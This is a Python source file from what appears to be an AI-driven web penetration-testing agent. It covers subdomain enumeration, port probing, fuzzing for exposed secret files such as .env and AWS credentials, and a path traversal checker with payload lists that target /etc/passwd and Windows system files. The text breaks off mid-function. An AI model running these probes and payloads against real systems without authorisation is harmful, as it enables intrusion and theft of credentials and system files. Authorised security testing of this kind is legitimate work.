"""
WSLBridgeTools - Unified tool layer merging all branches.
Includes: recon, nikto, ffuf, web search, fuzzing, secrets, report generation.
All commands are guarded by the SafetyLayer before execution.
"""
import subprocess
import os
import re
import json
import sqlite3
import shlex
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from dotenv import load_dotenv
import threading

load_dotenv()

from core.memory import ArgusMemory
from core.safety import SafetyLayer

try:
    from langchain_community.tools import DuckDuckGoSearchRun
    from langchain_community.utilities import DuckDuckGoSearchAPIWrapper
    DUCKDUCKGO_AVAILABLE = True
except ImportError:
    DUCKDUCKGO_AVAILABLE = False


class WSLBridgeTools:
    def __init__(self, scan_mode: str = "passive", allow_internal: bool = False):
        self.host = os.getenv("WSL_HOST", "127.0.0.1")
        self.user = os.getenv("WSL_USER", "momen")
        self.password = os.getenv("WSL_PASS", "momen")
        self.port = int(os.getenv("WSL_PORT", 22))
        self.distro = os.getenv("WSL_DISTRO", "kali-linux")
        self.scan_mode = scan_mode
        self._lock = threading.Lock()
        self.last_recon_results = None
        self.memory = ArgusMemory()
        self.safety = SafetyLayer(allow_internal=allow_internal)
        # Report output directory
        self.reports_dir = Path(__file__).parent.parent / "reports"
        self.reports_dir.mkdir(exist_ok=True)
        # Per-scan-session cache: enumerate_subdomains() is expensive (crt.sh
        # retries + DNS brute-force) and was being re-run from scratch every
        # time Recon_Suite was called (it calls enumerate_subdomains
        # internally) PLUS whenever the agent called Subdomain_Enumeration
        # directly - observed burning multiple crt.sh 502/timeout retry
        # cycles (up to 90s each) for the SAME domain in a single scan.
        # Scoped to this instance, so it never leaks across separate scans
        # (a fresh WSLBridgeTools is created per scan session).
        self._subdomain_cache = {}

    def _clean_ansi(self, text: str) -> str:
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        return ansi_escape.sub('', text)

    def _extract_domain(self, raw: str) -> str:
        """Extracts plain domain from input that may be a URL, JSON, or natural-language string.

        Defensive secondary guard: even if _extract_target() in agent.py passes the entire
        user query, this method will still pull out the correct domain via regex fallback.
        """
        if not isinstance(raw, str):
            raw = str(raw)
        raw = raw.strip()
        # Handle JSON input from agent
        if raw.startswith('{'):
            try:
                parsed = json.loads(raw)
                raw = (parsed.get('target') or parsed.get('domain') or
                       parsed.get('url') or parsed.get('input') or raw)
            except Exception:
                pass
        # Strip protocol and path
        domain = (raw.replace('https://', '').replace('http://', '')
                  .split('/')[0].split(':')[0].replace('www.', '').strip())
        # If the result still contains spaces it is a full query string, not a domain.
        # Fall back to regex extraction so we never pass prose into shell commands.
        if ' ' in domain:
            m = re.search(
                r'\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b',
                domain
            )
            if m:
                return m.group(0)
            # Absolute last resort
            return domain.split()[0]
        return domain

    def run(self, command: str, show_prompt: bool = False) -> str:
        """Executes a command in WSL Kali with safety checks."""
        is_safe, reason = self.safety.guard_command(command)
        if not is_safe:
            return f"[SAFETY BLOCK] {reason}"

        try:
            wsl_cmd = ["wsl", "-d", self.distro, "-u", self.user, "bash", "-c", command]
            result = subprocess.run(
                wsl_cmd, capture_output=True, text=True,
                timeout=600, encoding='utf-8', errors='ignore'
            )
            if result.returncode != 0:
                error_msg = result.stderr or result.stdout
                if "command not found" in error_msg.lower():
                    return f"Error: Tool not installed in WSL. Suggestion: apt install the missing tool."
                if "permission denied" in error_msg.lower():
                    return f"Error: Permission denied. Try running with sudo."
                return f"Error (Code {result.returncode}): {self._clean_ansi(error_msg)}"
            output = result.stdout or result.stderr
            cleaned = self._clean_ansi(output)
            if show_prompt:
                return f"\u250c\u2500\u2500(kali\u2127WSL)-[~]\n\u2514\u2500$ {command}\n{cleaned}"
            return cleaned
        except subprocess.TimeoutExpired:
            return "Error: Command timed out after 600s."
        except Exception as e:
            return f"Bridge Error: {str(e)}"

    # ─── REACHABILITY ─────────────────────────────────────────────────────────

    def check_reachability(self, domain: str) -> str:
        """Checks reachability using Python requests (no WSL needed)."""
        import requests as _req, socket as _sock
        import urllib3; urllib3.disable_warnings()
        clean_host = self._extract_domain(domain)
        print(f"[*] Checking reachability for: {clean_host}")

        is_valid, reason = self.safety.validate_target(clean_host, self.scan_mode)
        if not is_valid:
            return f"[SAFETY] Target validation failed: {reason}"

        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        info_lines = []

        for scheme in ("http", "https"):
            url = f"{scheme}://{clean_host}"
            try:
                r = _req.get(url, headers=headers, timeout=10,
                             allow_redirects=True, verify=False)
                server = r.headers.get("Server", "unknown")
                powered = r.headers.get("X-Powered-By", "")
                asp_ver = r.headers.get("X-AspNet-Version", "")
                tech = " | ".join(filter(None, [server, powered, asp_ver])) or "unknown"
                info_lines.append(f"  [{scheme.upper()}] {url} → HTTP {r.status_code} | Tech: {tech}")
                self.memory.upsert_entity("domain", clean_host)
                self.memory.add_finding(clean_host, "curl", "headers",
                    str(dict(r.headers)), "HTTP Headers captured")
            except Exception as e:
                info_lines.append(f"  [{scheme.upper()}] {url} → {e}")

        # DNS resolve
        try:
            ip = _sock.gethostbyname(clean_host)
            self.memory.upsert_entity("ip", ip)
            self.memory.add_relation(clean_host, ip, "HOSTS")
            info_lines.append(f"  [DNS ] {clean_host} → {ip}")
        except Exception as e:
            info_lines.append(f"  [DNS ] Resolution failed: {e}")

        if any("HTTP 2" in l or "HTTP 3" in l for l in info_lines):
            return f"[OK] {clean_host} is reachable:\n" + "\n".join(info_lines)
        return f"[WARN] {clean_host} may be unreachable:\n" + "\n".join(info_lines)

    # ─── SUBDOMAIN ENUMERATION ────────────────────────────────────────────────

    def enumerate_subdomains(self, domain: str) -> str:
        """Discovers subdomains via crt.sh Certificate Transparency + DNS brute-force (no WSL)."""
        import requests as _req, socket as _sock
        import urllib3; urllib3.disable_warnings()
        clean_domain = self._extract_domain(domain)

        # Per-scan cache: Recon_Suite calls this internally, and the agent can
        # also call Subdomain_Enumeration directly — without this, the SAME
        # domain could trigger crt.sh's retry loop 3+ times in one scan
        # (observed burning minutes on a dead/rate-limited crt.sh alone).
        cached = self._subdomain_cache.get(clean_domain)
        if cached is not None:
            print(f"[*] Subdomain enumeration for: {clean_domain} (cached from earlier this scan)")
            return cached

        print(f"[*] Subdomain enumeration for: {clean_domain}")

        all_subs = set()

        # ── crt.sh Certificate Transparency (slow/flaky service: retry) ──────
        # Tightened from 30s x3 to 10s x2 — a rate-limited/down crt.sh (502,
        # or timeouts) should fail fast so the scan can move on to actually
        # testing the target instead of burning its decision budget on a dead
        # external service. The hackertarget fallback below still runs either way.
        import time as _time
        CRTSH_TIMEOUT, CRTSH_RETRIES = 10, 2
        for _attempt in range(CRTSH_RETRIES):
            try:
                r = _req.get(f"https://crt.sh/?q=%.{clean_domain}&output=json",
                             timeout=CRTSH_TIMEOUT, verify=False)
                # crt.sh often returns an empty body or an HTML error page when
                # rate-limited — that is NOT JSON, so guard before parsing.
                body = (r.text or "").strip()
                if r.status_code != 200 or not body.startswith("["):
                    print(f"[!] crt.sh attempt {_attempt + 1}/{CRTSH_RETRIES}: non-JSON "
                          f"(HTTP {r.status_code}) — retrying")
                    _time.sleep(1)
                    continue
                for entry in r.json():
                    names = entry.get("name_value", "")
                    for n in names.splitlines():
                        n = n.strip().lstrip("*.")
                        if n.endswith(clean_domain) and n != clean_domain:
                            all_subs.add(n)
                break
            except Exception as e:
                print(f"[!] crt.sh attempt {_attempt + 1}/{CRTSH_RETRIES} failed: {e}")
                _time.sleep(1)

        # ── Fallback CT source when crt.sh is down (502/503/timeout) ─────────
        # crt.sh is frequently overloaded; use a second free source so subdomain
        # discovery does not depend on a single service being up.
        if not all_subs:
            try:
                r2 = _req.get(f"https://api.hackertarget.com/hostsearch/?q={clean_domain}",
                              timeout=15, verify=False)
                txt = r2.text or ""
                if r2.status_code == 200 and "," in txt and "error" not in txt.lower() \
                        and "api count" not in txt.lower():
                    for line in txt.splitlines():
                        host = line.split(",")[0].strip().lstrip("*.").lower()
                        if host.endswith(clean_domain) and host != clean_domain:
                            all_subs.add(host)
                    if all_subs:
                        print(f"[+] Fallback (hackertarget) found {len(all_subs)} subdomains")
            except Exception as e:
                print(f"[!] hackertarget fallback failed: {e}")

        # ── Common prefix brute-force (DNS) ──────────────────────────────────
        COMMON = ["www", "mail", "api", "dev", "staging", "admin", "portal",
                  "app", "beta", "cdn", "shop", "blog", "static", "assets"]
        for prefix in COMMON:
            candidate = f"{prefix}.{clean_domain}"
            try:
                _sock.gethostbyname(candidate)
                all_subs.add(candidate)
            except Exception:
                pass

        if not all_subs:
            result = (f"--- SUBDOMAIN ENUMERATION: {clean_domain} ---\n"
                      f"[+] No subdomains found via crt.sh or DNS brute-force.\n"
                      f"    The domain may have no delegated subdomains, or crt.sh had no records.")
            self._subdomain_cache[clean_domain] = result
            return result

        # ── Verify which are alive ────────────────────────────────────────────
        alive = []
        for sub in list(all_subs)[:30]:
            for scheme in ("https", "http"):
                try:
                    r2 = _req.get(f"{scheme}://{sub}", timeout=6,
                                  allow_redirects=True, verify=False)
                    alive.append(f"{scheme}://{sub} [{r2.status_code}]")
                    break
                except Exception:
                    pass
            self.memory.upsert_entity("subdomain", sub)
            self.memory.add_relation(clean_domain, sub, "HAS_SUBDOMAIN")
            self.memory.upsert_target(sub, parent_domain=clean_domain)

        self.memory.upsert_entity("domain", clean_domain)
        result = (f"--- SUBDOMAIN ENUMERATION: {clean_domain} ---\n"
                  f"[+] Total: {len(all_subs)} | Alive: {len(alive)}\n\n"
                  f"TOP VERIFIED SUBDOMAINS:\n" + "\n".join(f"  {l}" for l in alive[:20]) +
                  f"\n\nALL DISCOVERED:\n" + "\n".join(f"  {s}" for s in sorted(all_subs)))
        self._subdomain_cache[clean_domain] = result
        return result

    # ─── PRIORITY TARGETS ─────────────────────────────────────────────────────

    def get_priority_targets(self, _=None) -> str:
        """Returns top prioritized targets from memory for the agent."""
        return self.memory.get_priority_targets(limit=10)

    # ─── TARGET PRIORITIZATION ────────────────────────────────────────────────

    def prioritize_targets(self, targets: list) -> list:
        """Scores targets by security interest using multi-tier keyword scoring."""
        CRITICAL = ['admin', 'auth', 'login', 'api', 'internal', 'vpn', 'ssh']
        HIGH = ['checkout', 'payment', 'portal', 'dashboard', 'dev', 'staging', 'git', 'jenkins']
        MEDIUM = ['mail', 'mobile', 'db', 'database', 'old', 'beta', 'partner']
        LOW_VALUE = ['cdn', 'static', 'assets', 'blog', 'analytics', 'status']

        scored = []
        for target in targets:
            t_lower = target.lower()
            score = 0
            score += sum(30 for kw in CRITICAL if kw in t_lower)
            score += sum(20 for kw in HIGH if kw in t_lower)
            score += sum(10 for kw in MEDIUM if kw in t_lower)
            score -= sum(10 for kw in LOW_VALUE if kw in t_lower)
            if target.count('.') >= 3:
                score += 10
            first = target.split('.')[0].lower()
            if first in ['www', 'ftp', 'mx', 'ns1', 'ns2']:
                score -= 15
            scored.append((score, target))
            self.memory.upsert_target(target, priority=score)

        scored.sort(key=lambda x: x[0], reverse=True)
        return [t for _, t in scored]

    # ─── RECON SUITE ──────────────────────────────────────────────────────────

    def recon_suite(self, url: str, selected_targets=None) -> str:
        """Parallel recon: WAF, WhatWeb, Nmap, Headers, Fuzzing, Secrets."""
        base_target = self._extract_domain(url)
        root_domain = base_target
        print(f"[*] Starting Recon Suite for: {root_domain}")

        # Determine targets to scan
        if not selected_targets:
            sub_report = self.enumerate_subdomains(root_domain)
            alive_targets = []
            capture = False
            for line in sub_report.split('\n'):
                if 'TOP VERIFIED SUBDOMAINS:' in line:
                    capture = True
                    continue
                if capture and 'INFRASTRUCTURE POINTERS' in line:
                    capture = False
                    break
                if capture and line.strip() and not line.strip().startswith('['):
                    t = line.strip().replace('https://', '').replace('http://', '').split()[0]
                    # Skip error strings and non-domain values
                    if t and '.' in t and not t.lower().startswith('error') and not t.startswith('('):
                        alive_targets.append(t)
            process_targets = self.prioritize_targets(list(set(alive_targets)))[:3]
            if base_target not in process_targets:
                process_targets.append(base_target)
        else:
            process_targets = selected_targets
            sub_report = ""

        results = [f"--- ARGUS RECON REPORT: {root_domain} ---",
                   f"[+] Scanning: {', '.join(process_targets)}"]

        def scan_target(target):
            import requests as _req, socket as _sock
            import urllib3; urllib3.disable_warnings()
            hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
            t_url = f"http://{target}" if not target.startswith('http') else target

            # ── Headers + WAF + Tech via Python requests ──────────────────────
            waf_sum = "WAF: Not detected"
            tech_sum = "Tech: Unknown"
            headers_raw = ""
            try:
                r = _req.get(t_url, headers=hdrs, timeout=10,
                             allow_redirects=True, verify=False)
                h = r.headers
                headers_raw = "\n".join(f"{k}: {v}" for k, v in h.items())
                # WAF detection from headers
                waf_headers = {
                    "cloudflare": "Cloudflare", "sucuri": "Sucuri", "incapsula": "Imperva",
                    "akamai": "Akamai", "barracuda": "Barracuda", "f5": "F5 BIG-IP",
                    "x-sucuri-id": "Sucuri", "x-firewall": "Firewall",
                }
                waf_detected = next(
                    (name for hdr, name in waf_headers.items()
                     if any(hdr.lower() in k.lower() or hdr.lower() in v.lower()
                            for k, v in h.items())), None
                )
                waf_sum = f"WAF: {waf_detected}" if waf_detected else "WAF: Not detected"
                # Tech fingerprint from headers
                tech_parts = [v for k, v in h.items()
                              if k.lower() in ("server", "x-powered-by", "x-aspnet-version",
                                               "x-generator", "x-drupal-cache")]
                tech_sum = "Tech: " + " | ".join(tech_parts) if tech_parts else "Tech: Unknown"
                self.memory.add_finding(target, "curl", "headers", headers_raw, "HTTP Headers captured")
            except Exception as e:
                headers_raw = f"Error fetching headers: {e}"

            # ── Port check via socket ──────────────────────────────────────────
            PORTS = [80, 443, 8080, 8443, 8000, 3000]
            if self.scan_mode == "aggressive":
                PORTS += [21, 22, 25, 3306, 5432, 6379, 27017]
            open_ports = []
            for port in PORTS:
                try:
                    s = _sock.create_connection((target.split('/')[0], port), timeout=2)
                    s.close()
                    open_ports.append(str(port))
                except Exception:
                    pass
            ports_sum = "Open ports: " + ", ".join(open_ports) if open_ports else "No open ports"

            fuzz = self.fuzz_sensitive_files(t_url)
            secrets = self.analyze_secrets(t_url)

            # Save to memory
            self.memory.add_finding(target, "wafw00f", "waf", waf_sum, waf_sum)
            self.memory.add_finding(target, "whatweb", "tech", tech_sum, tech_sum)
            self.memory.add_finding(target, "nmap", "ports", ports_sum, ports_sum)
            # Only a CONTENT-VERIFIED file is a real leak (High). A 403 ("PROTECTED")
            # means the path exists but is blocked — that is good hygiene, not a leak,
            # so record it as Info and never let it inflate the risk score.
            if 'CONFIRMED:' in fuzz:
                self.memory.add_finding(target, "fuzzer", "leak", fuzz,
                                        "Sensitive file exposed (content-verified)", severity="High")
            elif 'PROTECTED' in fuzz:
                self.memory.add_finding(target, "fuzzer", "protected", fuzz,
                                        "Sensitive path exists but returns 403 (protected)", severity="Info")
            if '[!]' in secrets:
                self.memory.add_finding(target, "analyzer", "secrets", secrets, "Secrets in HTML", severity="High")

            return (f"\n=== TARGET: {target} ===\n"
                    f"WAF: {waf_sum}\n"
                    f"Tech: {tech_sum}\n"
                    f"Ports: {ports_sum}\n"
                    f"Fuzzing: {fuzz[:300]}\n"
                    f"Secrets: {secrets[:300]}")

        max_workers = 3 if self.scan_mode == "aggressive" else 2
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            for r in ex.map(scan_target, process_targets):
                results.append(r)

        full_report = "\n".join(results)
        self.last_recon_results = {"ai_input": full_report}
        return full_report

    # ─── FUZZING ──────────────────────────────────────────────────────────────

    def fuzz_sensitive_files(self, url: str) -> str:
        """Sensitive file detection with content verification to eliminate custom-404 false positives."""
        import requests as _req
        import urllib3; urllib3.disable_warnings()
        clean_url = url.rstrip('/')
        hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

        # Files to check + required content signatures (must be present to confirm)
        TARGETS = {
            ".env":                    ["DB_", "APP_", "SECRET", "KEY=", "HOST=", "PASSWORD="],
            ".git/config":             ["[core]", "[remote", "repositoryformatversion"],
            ".git/HEAD":               ["ref: refs/heads/"],
            "phpinfo.php":             ["PHP Version", "PHP_OS", "phpinfo()"],
            "config.php.bak":          ["<?php", "password", "database"],
            ".htaccess":               ["RewriteEngine", "Options ", "Require "],
            "web.config":              ["<configuration>", "<system.web>", "connectionStrings"],
            ".aws/credentials":        ["[default]", "aws_access_key_id"],
            "backup.sql":              ["CREATE TABLE", "INSERT INTO"],
            "database.sql":            ["CREATE TABLE", "INSERT INTO"],
            "composer.json":           ['"require":', '"name":'],
            "package.json":            ['"dependencies":', '"scripts":'],
            ".npmrc":                  ["registry=", "_authToken"],
            "server-status":           ["requests currently being processed", "Apache Server Status"],
        }

        # Step 1: Baseline — check a random path to detect custom-404-as-200
        rand_path = f"{clean_url}/argus_nonexistent_probe_path_7x9z"
        try:
            baseline = _req.get(rand_path, headers=hdrs, timeout=5,
                                allow_redirects=True, verify=False)
            soft_404 = baseline.status_code == 200
            baseline_len = len(baseline.text)
        except Exception:
            soft_404 = False
            baseline_len = 0

        found = []

        def check(item):
            path, sigs = item
            full = f"{clean_url}/{path}"
            try:
                r = _req.get(full, headers=hdrs, timeout=6,
                             allow_redirects=True, verify=False)
                if r.status_code == 403:
                    return f"[?] PROTECTED (403): {full}"
                if r.status_code not in (200, 206):
                    return None
                body = r.text
                # Soft-404 check: same status AND nearly same length as baseline → fake 200
                if soft_404 and abs(len(body) - baseline_len) < 200:
                    return None
                # Content signature check — must match at least one sig
                hit = next((s for s in sigs if s.lower() in body.lower()), None)
                if not hit:
                    return None
                snippet = body[:150].replace('\n', ' ').strip()
                return f"[!] CONFIRMED: {full}\n    Matched: '{hit}'\n    Snippet: {snippet}"
            except Exception:
                return None

        with ThreadPoolExecutor(max_workers=6) as ex:
            found = [r for r in ex.map(check, TARGETS.items()) if r]

        if not found:
            return "No sensitive files confirmed (content-verified)."
        return "--- SENSITIVE FILES ---\n" + "\n".join(found)

    # ─── PARAMETER DISCOVERY ENGINE ──────────────────────────────────────────────

    def _discover_parameters(self, base_url: str) -> dict:
        """Auto-discover URL parameters on a target via three phases.

        Phase A — HTML crawl:   forms, href links, img src, script src
        Phase B — JS analysis:  fetch / axios / XHR call patterns in .js files
        Phase C — Arjun-style:  response-length baseline comparison against
                                 a 130-word param wordlist (batch then binary-search)

        Returns: {endpoint_url: set(param_names)}
        e.g. {'/image': {'filename'}, '/product': {'id', 'category'}}
        """
        import requests as _req
        import urllib.parse as _up
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        discovered = {}   # {full endpoint url: set of param names}

        UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
              "AppleWebKit/537.36 Chrome/124.0 Safari/537.36")
        headers = {"User-Agent": UA}
        TIMEOUT = 10

        # ── Candidate wordlist for Arjun-style phase ──────────────────────────
        PARAM_WORDLIST = [
            "id", "name", "file", "filename", "path", "page", "document", "doc",
            "img", "image", "src", "url", "resource", "type", "cat", "category",
            "search", "q", "query", "data", "content", "template", "include",
            "load", "read", "module", "action", "method", "view", "format",
            "callback", "redirect", "next", "return", "ref", "token", "key",
            "user", "username", "email", "cmd", "exec", "dir", "folder", "root",
            "base", "prefix", "suffix", "lang", "language", "locale", "theme",
            "style", "layout", "tab", "section", "article", "post", "item",
            "product", "order", "shop", "menu", "widget", "component", "part",
            "version", "v", "api", "endpoint", "service", "output", "input",
            "value", "param", "arg", "option", "config", "setting", "mode",
            "debug", "test", "admin", "user_id", "userid", "account", "profile",
            "session", "report", "export", "import", "download", "upload",
            "attach", "media", "photo", "video", "audio", "thumb", "preview",
            "cache", "from", "to", "start", "end", "limit", "offset", "count",
            "sort", "order_by", "filter", "group", "tag", "label", "index",
            "hash", "sign", "timestamp", "date", "year", "month", "day",
            "ext", "extension", "mime", "encoding", "host", "domain", "ip",
            "port", "path_info", "script_name", "view_id", "page_id", "cat_id",
        ]

        def _add(endpoint, params):
            ep = endpoint.rstrip('/')
            if ep not in discovered:
                discovered[ep] = set()
            discovered[ep].update(p for p in params if p and len(p) <= 40)

        def _safe_get(u):
            try:
                return _req.get(u, headers=headers, timeout=TIMEOUT,
                                verify=False, allow_redirects=True)
            except Exception:
                return None

        base = base_url.rstrip('/')
        base_parsed = _up.urlparse(base)
        origin = f"{base_parsed.scheme}://{base_parsed.netloc}"

        # ═══════════════════════════════════════════════════════════════════════
        # Phase A — HTML crawl
        # ═══════════════════════════════════════════════════════════════════════
        pages_visited = set()
        crawl_queue   = [base]

        for page_url in crawl_queue[:15]:
            if page_url in pages_visited:
                continue
            pages_visited.add(page_url)

            resp = _safe_get(page_url)
            if not resp:
                continue
            html = resp.text

            # href links with query params
            for link in re.findall(r'href=["\']([^"\']+\?[^"\']+)["\']', html, re.I):
                if not link.startswith('http'):
                    link = f"{origin}/{link.lstrip('/')}"
                try:
                    p = _up.urlparse(link)
                    params = set(_up.parse_qs(p.query).keys())
                    ep = f"{p.scheme}://{p.netloc}{p.path}"
                    _add(ep, params)
                    # enqueue same-domain bare path for crawl
                    if base_parsed.netloc in link:
                        bare = link.split('?')[0]
                        if bare not in pages_visited:
                            crawl_queue.append(bare)
                except Exception:
                    pass

            # form inputs
            for form in re.findall(
                r'<form\b([^>]*)>(.*?)</form>', html, re.I | re.DOTALL
            ):
                attrs, body = form
                action_m = re.search(r'action=["\']([^"\']*)["\']', attrs, re.I)
                action = action_m.group(1).strip() if action_m else ''
                if not action:
                    action = page_url
                if not action.startswith('http'):
                    action = f"{origin}/{action.lstrip('/')}"
                names = re.findall(
                    r'<(?:input|select|textarea)\b[^>]*name=["\']([^"\']+)["\']',
                    body, re.I
                )
                _add(action, names)

            # img src with query params
            for src in re.findall(
                r'<img\b[^>]+src=["\']([^"\']+\?[^"\']+)["\']', html, re.I
            ):
                if not src.startswith('http'):
                    src = f"{origin}/{src.lstrip('/')}"
                try:
                    p = _up.urlparse(src)
                    _add(f"{p.scheme}://{p.netloc}{p.path}", set(_up.parse_qs(p.query).keys()))
                except Exception:
                    pass

            # script src with query params
            for src in re.findall(
                r'<script\b[^>]+src=["\']([^"\']+\?[^"\']+)["\']', html, re.I
            ):
                if not src.startswith('http'):
                    src = f"{origin}/{src.lstrip('/')}"
                try:
                    p = _up.urlparse(src)
                    _add(f"{p.scheme}://{p.netloc}{p.path}", set(_up.parse_qs(p.query).keys()))
                except Exception:
                    pass

        # ═══════════════════════════════════════════════════════════════════════
        # Phase B — JavaScript file analysis
        # ═══════════════════════════════════════════════════════════════════════
        js_urls = set()
        home_resp = _safe_get(base)
        if home_resp:
            for js in re.findall(
                r'<script\b[^>]+src=["\']([^"\']+\.js[^"\']*)["\']',
                home_resp.text, re.I
            ):
                if not js.startswith('http'):
                    js = f"{origin}/{js.lstrip('/')}"
                js_urls.add(js)

        for js_url in list(js_urls)[:10]:
            r = _safe_get(js_url)
            if not r:
                continue
            js_src = r.text

            # fetch('/path?param=val') / fetch("/path", {…})
            for m in re.finditer(r'fetch\s*\(\s*["\']([^"\']+)["\']', js_src):
                u = m.group(1)
                if '?' in u:
                    try:
                        p = _up.urlparse(u)
                        ep = f"{origin}{p.path}" if p.path.startswith('/') else f"{origin}/{p.path}"
                        _add(ep, set(_up.parse_qs(p.query).keys()))
                    except Exception:
                        pass

            # axios.get('/path?…') / axios.post('/path?…')
            for m in re.finditer(r'axios\s*\.\s*\w+\s*\(\s*["\']([^"\']+)["\']', js_src):
                u = m.group(1)
                if '?' in u:
                    try:
                        p = _up.urlparse(u)
                        ep = f"{origin}{p.path}" if p.path.startswith('/') else f"{origin}/{p.path}"
                        _add(ep, set(_up.parse_qs(p.query).keys()))
                    except Exception:
                        pass

            # $.get / $.post / $.ajax with URL strings
            for m in re.finditer(r'\$\.\w+\s*\(\s*["\']([^"\']+)["\']', js_src):
                u = m.group(1)
                if '?' in u:
                    try:
                        p = _up.urlparse(u)
                        ep = f"{origin}{p.path}" if p.path.startswith('/') else f"{origin}/{p.path}"
                        _add(ep, set(_up.parse_qs(p.query).keys()))
                    except Exception:
                        pass

            # String literals that look like param names referenced in the JS
            js_param_candidates = set(re.findall(r'["\']([a-z_][a-z0-9_]{1,25})["\']', js_src))
            matched = js_param_candidates & set(PARAM_WORDLIST)
            if matched:
                _add(base, matched)

        # ═══════════════════════════════════════════════════════════════════════
        # Phase C — Arjun-style hidden param detection
        # ═══════════════════════════════════════════════════════════════════════
        try:
            fake = "xargus" + str(abs(hash(base_url)) % 100000)
            bl = _safe_get(f"{base}?{fake}=1")
            if bl:
                baseline_len  = len(bl.text)
                baseline_code = bl.status_code

                hidden = set()
                batch_sz = 25

                for i in range(0, len(PARAM_WORDLIST), batch_sz):
                    batch = PARAM_WORDLIST[i: i + batch_sz]
                    qs = "&".join(f"{p}=argustest" for p in batch)
                    br = _safe_get(f"{base}?{qs}")
                    if not br:
                        continue
                    diff = abs(len(br.text) - baseline_len)
                    if diff > 50 or br.status_code != baseline_code:
                        # binary-search within batch
                        for param in batch:
                            sr = _safe_get(f"{base}?{param}=argustest999")
                            if not sr:
                                continue
                            sdiff = abs(len(sr.text) - baseline_len)
                            if sdiff > 30 or sr.status_code != baseline_code:
                                hidden.add(param)

                if hidden:
                    _add(base, hidden)
        except Exception:
            pass

        return discovered

    # ─── PATH TRAVERSAL ───────────────────────────────────────────────────────

    def check_path_traversal(self, url: str) -> str:
        """Active path traversal / LFI.

        Phase 1: fixed known-vulnerable endpoints (ASP.NET + generic Linux).
        Phase 2: crawl href links, inject traversal into file parameters.
        Phase 3: crawl img src tags — catches image-loading endpoints
                 (e.g. /image?filename=) which href crawl misses.
        """
        import requests as _req
        import urllib.parse as _up
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        clean_url = url.strip().rstrip('/')
        if not clean_url.startswith(('http://', 'https://')):
            clean_url = f"https://{clean_url}"
        target = self._extract_domain(clean_url)

        UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
              "AppleWebKit/537.36 Chrome/124.0 Safari/537.36")
        headers = {"User-Agent": UA}
        TIMEOUT = 25

        WIN_SIGS = ["[boot loader]", "operating systems", "[fonts]", "[extensions]"]
        LIN_SIGS = ["root:x:", "root:/bin", "daemon:", "/bin/bash", "/bin/sh",
                    "nobody:", "www-data:", "/usr/sbin/nologin"]
        ALL_SIGS = WIN_SIGS + LIN_SIGS

        WIN_PAYLOADS = [
            "../../Windows/system.ini",
            "../../../Windows/system.ini",
            "..%2F..%2FWindows%2Fsystem.ini",
        ]
        LIN_PAYLOADS = [
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "..%2F..%2Fetc%2Fpasswd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]
        ALL_PAYLOADS = WIN_PAYLOADS + LIN_PAYLOADS

        FILE_PARAMS = {
            "filename", "file", "path", "page", "document", "doc",
            "image", "img", "src", "url", "resource", "template",
            "include", "load", "read", "module", "content",
            "cat", "id", "view", "name", "data",
        }

        FIXED_PAYLOADS = [
            ("/image?filename=../../etc/passwd",           LIN_SIGS),
            ("/image?filename=../../../etc/passwd",        LIN_SIGS),
            ("/image?filename=../../../../etc/passwd",     LIN_SIGS),
            ("/img?file=../../etc/passwd",                 LIN_SIGS),
            ("/static?resource=../../etc/passwd",          LIN_SIGS),
            ("/download?file=../../etc/passwd",            LIN_SIGS),
            ("/file?name=../../etc/passwd",                LIN_SIGS),
            ("/assets?path=../../etc/passwd",              LIN_SIGS),
            ("/?file=../../../../etc/passwd",              LIN_SIGS),
            ("/?page=../../../../etc/passwd",              LIN_SIGS),
            ("/?filename=../../etc/passwd",                LIN_SIGS),
            ("/?path=..%2F..%2F..%2Fetc%2Fpasswd",        LIN_SIGS),
            ("/?document=../../etc/passwd",                LIN_SIGS),
            ("/showforum.asp?id=../../Windows/system.ini", WIN_SIGS),
            ("/show.asp?file=../../Windows/system.ini",    WIN_SIGS),
            ("/read.asp?filename=../../Windows/win.ini",   WIN_SIGS),
            ("/?cat=..%2F..%2FWindows%2Fsystem.ini",      WIN_SIGS),
        ]

        all_results = []
        confirmed   = []

        def _probe(test_url, sigs):
            try:
                resp = _req.get(test_url, headers=headers, timeout=TIMEOUT,
                                stream=True, allow_redirects=True, verify=False)
                content = b""
                for chunk in resp.iter_content(chunk_size=2048):
                    content += chunk
                    if len(content) >= 8192:
                        break
                resp.close()
                body = content.decode("utf-8", errors="ignore")
                hit  = next((sg for sg in sigs if sg.lower() in body.lower()), None)
                return resp.status_code, hit, body
            except Exception as ex:
                return None, None, str(ex)

        def _record(full_url, label, hit, body):
            snippet = body.replace('\n', ' ').strip()[:400]
            all_results.append(
                f"  [CONFIRMED] {full_url}\n"
                f"              Matched : '{hit}'\n"
                f"              Snippet : {snippet}"
            )
            confirmed.append((full_url, label, hit, body[:600]))
            # raw_data carries full PoC detail (URL/payload/matched signature/evidence),
            # not just the body snippet, so the report/agent layer can build a
            # reproduction-steps section without re-deriving it from the LLM.
            poc = (f"URL: {full_url}\nPayload: {label}\nMatched: {hit}\n"
                   f"Evidence: {snippet}")
            self.memory.add_finding(
                target, "path_traversal", "vulnerability",
                poc, f"Path Traversal: {label}", severity="Critical"
            )

        # Phase 0 — auto-discovered parameter injection
        all_results.append("[ Phase 0 — AI auto-discovered parameter injection ]")
        try:
            auto_params = self._discover_parameters(clean_url)
            tested0 = set()
            phase0_count = 0
            for ep_url, pnames in auto_params.items():
                for pname in pnames:
